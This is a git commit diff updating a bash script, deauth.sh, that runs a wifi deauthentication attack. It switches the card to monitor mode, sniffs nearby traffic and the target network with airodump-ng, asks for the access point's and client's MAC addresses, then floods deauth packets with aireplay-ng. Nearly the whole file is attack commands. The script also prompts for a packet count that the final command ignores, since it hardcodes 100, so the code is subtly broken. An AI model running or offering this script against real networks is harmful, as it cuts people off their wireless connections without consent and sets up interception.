ee3c882da549e8b1f3109144930096ef704e95f4
ptsouth97 <ptsouth97@gmail.com>
2017-01-25 04:37:40 +0000

    updated deauth script

--- deauth.sh
+++ deauth.sh
@@ -12,17 +12,24 @@
 # The script also allows you to specify how many deauth packets to send
 # The script puts the wifi card back into managed mode and brings the network interface back up at the end
 
+ifconfig wlan0 down						# Bring the network interface down
+iwconfig wlan0 mode monitor					# Put the wifi card into monitor mode
+
+airodump-ng wlan0						# Sniff all traffic in the area
+
 echo "What is the target host's MAC address?"     		# Enter the target host's MAC address
 read host_mac
+
+echo "What is the target host's channel?"			
+read ch
+
+airodump-ng --channel $ch --bssid $host_mac wlan0		# Sniff traffic just on the target network
 
 echo "What is the target client's MAC address?"			# Enter the target client's MAC address
 read client_mac
 
 echo "How many packets do you want to send?"			# Enter how many packets to send
 read packets
-
-ifconfig wlan0 down						# Bring the network interface down
-iwconfig wlan0 mode monitor					# Put the wifi card into monitor mode
 
 aireplay-ng --deauth 100 -a $host_mac -c $client_mac wlan0	# Tell aireplay to send the packets
 
